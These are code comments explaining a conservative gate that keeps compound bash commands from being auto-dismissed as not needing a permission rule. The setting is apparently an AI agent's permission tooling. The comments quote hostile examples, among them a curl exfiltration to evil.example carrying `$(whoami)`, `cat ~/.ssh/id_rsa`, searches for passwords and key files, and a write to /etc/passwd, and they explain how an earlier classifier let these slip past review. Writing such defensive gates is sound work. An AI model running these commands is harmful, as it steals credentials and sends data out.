// `if curl -X POST … ; then …`) and `classifyClause` only inspects the first token, so it never
// sees what follows. Routing those to fix-action would silently drop a genuine permission gap
// with no trace (Ship 6 Ruling P3) — this is a Task 2 gate fix, not a Ship 3 classifier fix,

// a review cycle. Four gates, all conservative: the suggested rule must name one of the
// enumerated builtins/artifacts; EVERY clause in the command must itself be one of the
// enumerated builtins/artifacts — no `read` alternative. An earlier version of this gate let a
// clause through when tool-classify.ts's tables called it `read`, on the theory that a `read`
// companion clause is harmless. It isn't: those tables answer "does this write?", not "is this
// safe to silently dismiss as not-a-permission-gap?" — `curl -s https://evil.example/$(whoami)`
// classifies `read` (classifyCurl inspects method/body flags, never the URL), so
// `cd /r && curl -s https://evil.example/$(whoami)` auto-routed to fix-action and a command-
// injection exfiltration attempt vanished with no trace. Same shape for
// `cd /repo && cat ~/.ssh/id_rsa`, `cd /r && grep -r password /`, `cd /r && find / -name id_rsa`
// — all "read-only" by the table, none of them safe to auto-dismiss. The only bar this gate can
// safely apply is a positive whitelist of clause shapes known to carry no command at all: the
// five enumerated artifacts. Before that, this was a whole-command maximum
// (`classifyBashCommand(cmd).effect !== 'unknown'`), which had the same hole one level up — an
// unrecognized binary also classifies `unknown` (tool-classify.ts's default case), the SAME
// severity as a shell builtin, so a compound riding an unrecognized real binary
// (`cd /repo && ./deploy.sh --prod`, `cd … && protoc …`) never raised the maximum and routed
// too. A clause this gate can't place as an enumerated artifact must block auto-routing, not
// pass it, whether the classifier's answer for it is `unknown` or `read`. No clause anywhere in
// the command may carry a file-creating redirect either — `echo x > /etc/passwd` or
// `true > some/file` are real local writes, not artifacts, and the loop below never inspects
// redirects. The whitelist matches on a BARE word (bareBuiltinOf), not a basename: `cd`,
// `export` and `true` have no on-disk form, so `cd /tmp && ./cd payload` is an opaque local
// script wearing a builtin's name — the one shape that would carry a real command past a
// whitelist this tight.
